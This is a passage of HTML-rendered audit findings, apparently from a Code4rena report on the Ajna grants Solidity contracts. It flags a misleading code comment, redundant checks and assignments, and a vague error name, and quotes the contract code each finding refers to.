</span><span class=\"mtk12\">targets_</span><span class=\"mtk1\">.</span><span class=\"mtk12\">length</span><span class=\"mtk1\"> != </span><span class=\"mtk12\">values_</span><span class=\"mtk1\">.</span><span class=\"mtk12\">length</span><span class=\"mtk1\"> || </span><span class=\"mtk12\">targets_</span><span class=\"mtk1\">.</span><span class=\"mtk12\">length</span><span class=\"mtk1\"> != </span><span class=\"mtk12\">calldatas_</span><span class=\"mtk1\">.</span><span class=\"mtk12\">length</span><span class=\"mtk1\">) </span><span class=\"mtk12\">revert</span><span class=\"mtk1\"> </span><span class=\"mtk11\">InvalidProposal</span><span class=\"mtk1\">();</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        </span><span class=\"mtk15\">for</span><span class=\"mtk1\"> (</span><span class=\"mtk12\">uint256</span><span class=\"mtk1\"> </span><span class=\"mtk12\">i</span><span class=\"mtk1\"> = </span><span class=\"mtk7\">0</span><span class=\"mtk1\">; </span><span class=\"mtk12\">i</span><span class=\"mtk1\"> &lt; </span><span class=\"mtk12\">targets_</span><span class=\"mtk1\">.</span><span class=\"mtk12\">length</span><span class=\"mtk1\">;) {</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">            </span><span class=\"mtk3\">// check targets and values params are valid</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">            </span><span class=\"mtk15\">if</span><span class=\"mtk1\"> (</span><span class=\"mtk12\">targets_</span><span class=\"mtk1\">[</span><span class=\"mtk12\">i</span><span class=\"mtk1\">] != </span><span class=\"mtk12\">ajnaTokenAddress</span><span class=\"mtk1\"> || </span><span class=\"mtk12\">values_</span><span class=\"mtk1\">[</span><span class=\"mtk12\">i</span><span class=\"mtk1\">] != </span><span class=\"mtk7\">0</span><span class=\"mtk1\">) </span><span class=\"mtk12\">revert</span><span class=\"mtk1\"> </span><span class=\"mtk11\">InvalidProposal</span><span class=\"mtk1\">();</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">            ...</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        }</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    }</span></span></span></code></pre>\n<h2 id=\"05-code-comment-in-extraordinaryfunding_extraordinaryproposalsucceeded-function-can-be-incorrect\" style=\"position:relative;\"><a href=\"#05-code-comment-in-extraordinaryfunding_extraordinaryproposalsucceeded-function-can-be-incorrect\" aria-label=\"05 code comment in extraordinaryfunding_extraordinaryproposalsucceeded function can be incorrect permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>[05] CODE COMMENT IN <code>ExtraordinaryFunding._extraordinaryProposalSucceeded</code> FUNCTION CAN BE INCORRECT</h2>\n<p>In the following <code>ExtraordinaryFunding._extraordinaryProposalSucceeded</code> function, the comment for <code>(votesReceived >= tokensRequested_ + _getSliceOfNonTreasury(minThresholdPercentage))</code> is <code>succeeded if proposal's votes received doesn't exceed the minimum threshold required</code>. However, <code>(votesReceived >= tokensRequested_ + _getSliceOfNonTreasury(minThresholdPercentage))</code> can only be true when the proposal’s votes received meet or exceed such minimum threshold, which is the opposite of the comment. To prevent confusion, please consider updating the comment to match the corresponding code.</p>\n<p><a href=\"https://github.com/code-423n4/2023-05-ajna/blob/main/ajna-grants/src/grants/base/ExtraordinaryFunding.sol#L164-L178\">https://github.com/code-423n4/2023-05-ajna/blob/main/ajna-grants/src/grants/base/ExtraordinaryFunding.sol#L164-L178</a></p>\n<pre class=\"grvsc-container dark-default-dark\" data-language=\"solidity\" data-index=\"101\"><code class=\"grvsc-code\"><span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    </span><span class=\"mtk4\">function</span><span class=\"mtk1\"> </span><span class=\"mtk11\">_extraordinaryProposalSucceeded</span><span class=\"mtk1\">(</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        </span><span class=\"mtk12\">uint256</span><span class=\"mtk1\"> </span><span class=\"mtk12\">proposalId_</span><span class=\"mtk1\">,</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        </span><span class=\"mtk12\">uint256</span><span class=\"mtk1\"> </span><span class=\"mtk12\">tokensRequested_</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    ) </span><span class=\"mtk11\">internal</span><span class=\"mtk1\"> </span><span class=\"mtk11\">view</span><span class=\"mtk1\"> </span><span class=\"mtk11\">returns</span><span class=\"mtk1\"> (</span><span class=\"mtk12\">bool</span><span class=\"mtk1\">) {</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        </span><span class=\"mtk12\">uint256</span><span class=\"mtk1\"> </span><span class=\"mtk12\">votesReceived</span><span class=\"mtk1\">          = </span><span class=\"mtk11\">uint256</span><span class=\"mtk1\">(</span><span class=\"mtk12\">_extraordinaryFundingProposals</span><span class=\"mtk1\">[</span><span class=\"mtk12\">proposalId_</span><span class=\"mtk1\">].</span><span class=\"mtk12\">votesReceived</span><span class=\"mtk1\">);</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        </span><span class=\"mtk12\">uint256</span><span class=\"mtk1\"> </span><span class=\"mtk12\">minThresholdPercentage</span><span class=\"mtk1\"> = </span><span class=\"mtk11\">_getMinimumThresholdPercentage</span><span class=\"mtk1\">();</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        </span><span class=\"mtk15\">return</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">            </span><span class=\"mtk3\">// succeeded if proposal&#39;s votes received doesn&#39;t exceed the minimum threshold required</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">            (</span><span class=\"mtk12\">votesReceived</span><span class=\"mtk1\"> &gt;= </span><span class=\"mtk12\">tokensRequested_</span><span class=\"mtk1\"> + </span><span class=\"mtk11\">_getSliceOfNonTreasury</span><span class=\"mtk1\">(</span><span class=\"mtk12\">minThresholdPercentage</span><span class=\"mtk1\">))</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">            &amp;&amp;</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">            </span><span class=\"mtk3\">// succeeded if tokens requested are available for claiming from the treasury</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">            (</span><span class=\"mtk12\">tokensRequested_</span><span class=\"mtk1\"> &lt;= </span><span class=\"mtk11\">_getSliceOfTreasury</span><span class=\"mtk1\">(</span><span class=\"mtk12\">Maths</span><span class=\"mtk1\">.</span><span class=\"mtk12\">WAD</span><span class=\"mtk1\"> - </span><span class=\"mtk12\">minThresholdPercentage</span><span class=\"mtk1\">))</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        ;</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    }</span></span></span></code></pre>\n<h2 id=\"06-code-comment-for-challenge_period_length-can-be-more-accurate\" style=\"position:relative;\"><a href=\"#06-code-comment-for-challenge_period_length-can-be-more-accurate\" aria-label=\"06 code comment for challenge_period_length can be more accurate permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>[06] CODE COMMENT FOR <code>CHALLENGE_PERIOD_LENGTH</code> CAN BE MORE ACCURATE</h2>\n<p>The challenge phase starts after the time for <code>DISTRIBUTION_PERIOD_LENGTH</code> is finished. The time for <code>CHALLENGE_PERIOD_LENGTH</code> is more of an addition to the distribution period instead of part of the distribution period. Thus, describing <code>CHALLENGE_PERIOD_LENGTH</code> as <code>Length of the challengephase of the distribution period</code> given that <code>DISTRIBUTION_PERIOD_LENGTH</code> is described as <code>Length of the distribution period</code> is somewhat misleading. To avoid confusion, the comment for <code>CHALLENGE_PERIOD_LENGTH</code> can be updated to indicate that <code>CHALLENGE_PERIOD_LENGTH</code> is not included in <code>DISTRIBUTION_PERIOD_LENGTH</code>.</p>\n<p><a href=\"https://github.com/code-423n4/2023-05-ajna/blob/main/ajna-grants/src/grants/base/StandardFunding.sol#L29-L34\">https://github.com/code-423n4/2023-05-ajna/blob/main/ajna-grants/src/grants/base/StandardFunding.sol#L29-L34</a></p>\n<pre class=\"grvsc-container dark-default-dark\" data-language=\"solidity\" data-index=\"102\"><code class=\"grvsc-code\"><span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    </span><span class=\"mtk3\">/**</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk3\">     * </span><span class=\"mtk4\">@notice</span><span class=\"mtk3\"> Length of the challengephase of the distribution period in blocks.</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk3\">     * </span><span class=\"mtk4\">@dev</span><span class=\"mtk3\">    Roughly equivalent to the number of blocks in 7 days.</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk3\">     * </span><span class=\"mtk4\">@dev</span><span class=\"mtk3\">    The period in which funded proposal slates can be checked in updateSlate.</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk3\">     */</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    </span><span class=\"mtk12\">uint256</span><span class=\"mtk1\"> </span><span class=\"mtk12\">internal</span><span class=\"mtk1\"> </span><span class=\"mtk12\">constant</span><span class=\"mtk1\"> </span><span class=\"mtk12\">CHALLENGE_PERIOD_LENGTH</span><span class=\"mtk1\"> = </span><span class=\"mtk7\">50400</span><span class=\"mtk1\">;</span></span></span></code></pre>\n<p><a href=\"https://github.com/code-423n4/2023-05-ajna/blob/main/ajna-grants/src/grants/base/StandardFunding.sol#L36-L40\">https://github.com/code-423n4/2023-05-ajna/blob/main/ajna-grants/src/grants/base/StandardFunding.sol#L36-L40</a></p>\n<pre class=\"grvsc-container dark-default-dark\" data-language=\"solidity\" data-index=\"103\"><code class=\"grvsc-code\"><span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    </span><span class=\"mtk3\">/**</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk3\">     * </span><span class=\"mtk4\">@notice</span><span class=\"mtk3\"> Length of the distribution period in blocks.</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk3\">     * </span><span class=\"mtk4\">@dev</span><span class=\"mtk3\">    Roughly equivalent to the number of blocks in 90 days.</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk3\">     */</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    </span><span class=\"mtk12\">uint48</span><span class=\"mtk1\"> </span><span class=\"mtk12\">internal</span><span class=\"mtk1\"> </span><span class=\"mtk12\">constant</span><span class=\"mtk1\"> </span><span class=\"mtk12\">DISTRIBUTION_PERIOD_LENGTH</span><span class=\"mtk1\"> = </span><span class=\"mtk7\">648000</span><span class=\"mtk1\">;</span></span></span></code></pre>\n<h2 id=\"07-setting-support-to-1-when-voteparams_votesused--0-is-false-in-standardfunding_fundingvote-function-is-redundant\" style=\"position:relative;\"><a href=\"#07-setting-support-to-1-when-voteparams_votesused--0-is-false-in-standardfunding_fundingvote-function-is-redundant\" aria-label=\"07 setting support to 1 when voteparams_votesused  0 is false in standardfunding_fundingvote function is redundant permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>[07] SETTING <code>support</code> TO <code>1</code> WHEN <code>voteParams_.votesUsed &#x3C; 0</code> IS FALSE IN <code>StandardFunding._fundingVote</code> FUNCTION IS REDUNDANT</h2>\n<p>When calling the following <code>StandardFunding._fundingVote</code> function, <code>uint8 support = 1</code> is executed before <code>voteParams_.votesUsed &#x3C; 0 ? support = 0 : support = 1</code>. Therefore, when <code>voteParams_.votesUsed &#x3C; 0</code> is false, <code>support</code> does not need to be set to <code>1</code> again. Please consider refactoring the code to only update <code>support</code> to <code>0</code> when <code>voteParams_.votesUsed &#x3C; 0</code> is true.</p>\n<p><a href=\"https://github.com/code-423n4/2023-05-ajna/blob/main/ajna-grants/src/grants/base/StandardFunding.sol#L612-L690\">https://github.com/code-423n4/2023-05-ajna/blob/main/ajna-grants/src/grants/base/StandardFunding.sol#L612-L690</a></p>\n<pre class=\"grvsc-container dark-default-dark\" data-language=\"solidity\" data-index=\"104\"><code class=\"grvsc-code\"><span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    </span><span class=\"mtk4\">function</span><span class=\"mtk1\"> </span><span class=\"mtk11\">_fundingVote</span><span class=\"mtk1\">(</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        </span><span class=\"mtk12\">QuarterlyDistribution</span><span class=\"mtk1\"> </span><span class=\"mtk12\">storage</span><span class=\"mtk1\"> </span><span class=\"mtk12\">currentDistribution_</span><span class=\"mtk1\">,</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        </span><span class=\"mtk12\">Proposal</span><span class=\"mtk1\"> </span><span class=\"mtk12\">storage</span><span class=\"mtk1\"> </span><span class=\"mtk12\">proposal_</span><span class=\"mtk1\">,</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        </span><span class=\"mtk12\">address</span><span class=\"mtk1\"> </span><span class=\"mtk12\">account_</span><span class=\"mtk1\">,</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        </span><span class=\"mtk12\">QuadraticVoter</span><span class=\"mtk1\"> </span><span class=\"mtk12\">storage</span><span class=\"mtk1\"> </span><span class=\"mtk12\">voter_</span><span class=\"mtk1\">,</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        </span><span class=\"mtk12\">FundingVoteParams</span><span class=\"mtk1\"> </span><span class=\"mtk12\">memory</span><span class=\"mtk1\"> </span><span class=\"mtk12\">voteParams_</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    ) </span><span class=\"mtk11\">internal</span><span class=\"mtk1\"> </span><span class=\"mtk11\">returns</span><span class=\"mtk1\"> (</span><span class=\"mtk12\">uint256</span><span class=\"mtk1\"> </span><span class=\"mtk12\">incrementalVotesUsed_</span><span class=\"mtk1\">) {</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        </span><span class=\"mtk12\">uint8</span><span class=\"mtk1\">  </span><span class=\"mtk12\">support</span><span class=\"mtk1\"> = </span><span class=\"mtk7\">1</span><span class=\"mtk1\">;</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        </span><span class=\"mtk12\">uint256</span><span class=\"mtk1\"> </span><span class=\"mtk12\">proposalId</span><span class=\"mtk1\"> = </span><span class=\"mtk12\">proposal_</span><span class=\"mtk1\">.</span><span class=\"mtk12\">proposalId</span><span class=\"mtk1\">;</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        </span><span class=\"mtk3\">// determine if voter is voting for or against the proposal</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        </span><span class=\"mtk12\">voteParams_</span><span class=\"mtk1\">.</span><span class=\"mtk12\">votesUsed</span><span class=\"mtk1\"> &lt; </span><span class=\"mtk7\">0</span><span class=\"mtk1\"> ? </span><span class=\"mtk12\">support</span><span class=\"mtk1\"> = </span><span class=\"mtk7\">0</span><span class=\"mtk1\"> : </span><span class=\"mtk12\">support</span><span class=\"mtk1\"> = </span><span class=\"mtk7\">1</span><span class=\"mtk1\">;</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        ...</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    }</span></span></span></code></pre>\n<h2 id=\"08-redundant-execution-of-if-sumofthesquareofvotescast--typeuint128max-revert-insufficientvotingpower-in-standardfunding_fundingvote-function\" style=\"position:relative;\"><a href=\"#08-redundant-execution-of-if-sumofthesquareofvotescast--typeuint128max-revert-insufficientvotingpower-in-standardfunding_fundingvote-function\" aria-label=\"08 redundant execution of if sumofthesquareofvotescast  typeuint128max revert insufficientvotingpower in standardfunding_fundingvote function permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>[08] REDUNDANT EXECUTION OF <code>if (sumOfTheSquareOfVotesCast > type(uint128).max) revert InsufficientVotingPower()</code> IN <code>StandardFunding._fundingVote</code> FUNCTION</h2>\n<p>The following <code>StandardFunding._fundingVote</code> function executes <code>if (sumOfTheSquareOfVotesCast > type(uint128).max) revert InsufficientVotingPower()</code> before <code>uint128 cumulativeVotePowerUsed = SafeCast.toUint128(sumOfTheSquareOfVotesCast)</code>. Because calling the <code>SafeCast.toUint128</code> function below would revert when <code>sumOfTheSquareOfVotesCast > type(uint128).max</code> is true, executing <code>if (sumOfTheSquareOfVotesCast > type(uint128).max) revert InsufficientVotingPower()</code> becomes redundant. Please consider removing <code>if (sumOfTheSquareOfVotesCast > type(uint128).max) revert InsufficientVotingPower()</code> from the <code>StandardFunding._fundingVote</code> function.</p>\n<p><a href=\"https://github.com/code-423n4/2023-05-ajna/blob/main/ajna-grants/src/grants/base/StandardFunding.sol#L612-L690\">https://github.com/code-423n4/2023-05-ajna/blob/main/ajna-grants/src/grants/base/StandardFunding.sol#L612-L690</a></p>\n<pre class=\"grvsc-container dark-default-dark\" data-language=\"solidity\" data-index=\"105\"><code class=\"grvsc-code\"><span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    </span><span class=\"mtk4\">function</span><span class=\"mtk1\"> </span><span class=\"mtk11\">_fundingVote</span><span class=\"mtk1\">(</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        </span><span class=\"mtk12\">QuarterlyDistribution</span><span class=\"mtk1\"> </span><span class=\"mtk12\">storage</span><span class=\"mtk1\"> </span><span class=\"mtk12\">currentDistribution_</span><span class=\"mtk1\">,</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        </span><span class=\"mtk12\">Proposal</span><span class=\"mtk1\"> </span><span class=\"mtk12\">storage</span><span class=\"mtk1\"> </span><span class=\"mtk12\">proposal_</span><span class=\"mtk1\">,</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        </span><span class=\"mtk12\">address</span><span class=\"mtk1\"> </span><span class=\"mtk12\">account_</span><span class=\"mtk1\">,</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        </span><span class=\"mtk12\">QuadraticVoter</span><span class=\"mtk1\"> </span><span class=\"mtk12\">storage</span><span class=\"mtk1\"> </span><span class=\"mtk12\">voter_</span><span class=\"mtk1\">,</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        </span><span class=\"mtk12\">FundingVoteParams</span><span class=\"mtk1\"> </span><span class=\"mtk12\">memory</span><span class=\"mtk1\"> </span><span class=\"mtk12\">voteParams_</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    ) </span><span class=\"mtk11\">internal</span><span class=\"mtk1\"> </span><span class=\"mtk11\">returns</span><span class=\"mtk1\"> (</span><span class=\"mtk12\">uint256</span><span class=\"mtk1\"> </span><span class=\"mtk12\">incrementalVotesUsed_</span><span class=\"mtk1\">) {</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        ...</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        </span><span class=\"mtk3\">// calculate the cumulative cost of all votes made by the voter</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        </span><span class=\"mtk3\">// and check that attempted votes cast doesn&#39;t overflow uint128</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        </span><span class=\"mtk12\">uint256</span><span class=\"mtk1\"> </span><span class=\"mtk12\">sumOfTheSquareOfVotesCast</span><span class=\"mtk1\"> = </span><span class=\"mtk11\">_sumSquareOfVotesCast</span><span class=\"mtk1\">(</span><span class=\"mtk12\">votesCast</span><span class=\"mtk1\">);</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        </span><span class=\"mtk15\">if</span><span class=\"mtk1\"> (</span><span class=\"mtk12\">sumOfTheSquareOfVotesCast</span><span class=\"mtk1\"> &gt; </span><span class=\"mtk11\">type</span><span class=\"mtk1\">(</span><span class=\"mtk12\">uint128</span><span class=\"mtk1\">).</span><span class=\"mtk12\">max</span><span class=\"mtk1\">) </span><span class=\"mtk12\">revert</span><span class=\"mtk1\"> </span><span class=\"mtk11\">InsufficientVotingPower</span><span class=\"mtk1\">();</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        </span><span class=\"mtk12\">uint128</span><span class=\"mtk1\"> </span><span class=\"mtk12\">cumulativeVotePowerUsed</span><span class=\"mtk1\"> = </span><span class=\"mtk12\">SafeCast</span><span class=\"mtk1\">.</span><span class=\"mtk11\">toUint128</span><span class=\"mtk1\">(</span><span class=\"mtk12\">sumOfTheSquareOfVotesCast</span><span class=\"mtk1\">);</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        ...</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    }</span></span></span></code></pre>\n<p><a href=\"https://github.com/OpenZeppelin/openzeppelin-contracts/blob/master/contracts/utils/math/SafeCast.sol#L290-L293\">https://github.com/OpenZeppelin/openzeppelin-contracts/blob/master/contracts/utils/math/SafeCast.sol#L290-L293</a></p>\n<pre class=\"grvsc-container dark-default-dark\" data-language=\"solidity\" data-index=\"106\"><code class=\"grvsc-code\"><span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    </span><span class=\"mtk4\">function</span><span class=\"mtk1\"> </span><span class=\"mtk11\">toUint128</span><span class=\"mtk1\">(</span><span class=\"mtk12\">uint256</span><span class=\"mtk1\"> </span><span class=\"mtk12\">value</span><span class=\"mtk1\">) </span><span class=\"mtk11\">internal</span><span class=\"mtk1\"> </span><span class=\"mtk11\">pure</span><span class=\"mtk1\"> </span><span class=\"mtk11\">returns</span><span class=\"mtk1\"> (</span><span class=\"mtk12\">uint128</span><span class=\"mtk1\">) {</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        </span><span class=\"mtk11\">require</span><span class=\"mtk1\">(</span><span class=\"mtk12\">value</span><span class=\"mtk1\"> &lt;= </span><span class=\"mtk11\">type</span><span class=\"mtk1\">(</span><span class=\"mtk12\">uint128</span><span class=\"mtk1\">).</span><span class=\"mtk12\">max</span><span class=\"mtk1\">, </span><span class=\"mtk8\">&quot;SafeCast: value doesn&#39;t fit in 128 bits&quot;</span><span class=\"mtk1\">);</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        </span><span class=\"mtk15\">return</span><span class=\"mtk1\"> </span><span class=\"mtk11\">uint128</span><span class=\"mtk1\">(</span><span class=\"mtk12\">value</span><span class=\"mtk1\">);</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    }</span></span></span></code></pre>\n<h2 id=\"09-invalidvote-error-can-be-more-descriptive\" style=\"position:relative;\"><a href=\"#09-invalidvote-error-can-be-more-descriptive\" aria-label=\"09 invalidvote error can be more descriptive permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>[09] <code>InvalidVote</code> ERROR CAN BE MORE DESCRIPTIVE</h2>\n<p>The following <code>StandardFunding.fundingVote</code> and <code>StandardFunding.screeningVote</code> functions can revert with the <code>InvalidVote</code> error for various reasons. Yet, executing <code>revert InvalidVote()</code> does not describe the specific reason. To be more descriptive and user-friendly, please consider updating the <code>InvalidVote</code> error so it can provide the reason why calling the corresponding function reverts.</p>\n<p><a href=\"https://github.com/code-423n4/2023-05-ajna/blob/main/ajna-grants/src/grants/base/StandardFunding.sol#L519-L569\">https://github.com/code-423n4/2023-05-ajna/blob/main/ajna-grants/src/grants/base/StandardFunding.sol#L519-L569</a></p>\n<pre class=\"grvsc-container dark-default-dark\" data-language=\"solidity\" data-index=\"107\"><code class=\"grvsc-code\"><span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    </span><span class=\"mtk4\">function</span><span class=\"mtk1\"> </span><span class=\"mtk11\">fundingVote</span><span class=\"mtk1\">(</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        </span><span class=\"mtk12\">FundingVoteParams</span><span class=\"mtk1\">[] </span><span class=\"mtk12\">memory</span><span class=\"mtk1\"> </span><span class=\"mtk12\">voteParams_</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    ) </span><span class=\"mtk11\">external</span><span class=\"mtk1\"> </span><span class=\"mtk11\">override</span><span class=\"mtk1\"> </span><span class=\"mtk11\">returns</span><span class=\"mtk1\"> (</span><span class=\"mtk12\">uint256</span><span class=\"mtk1\"> 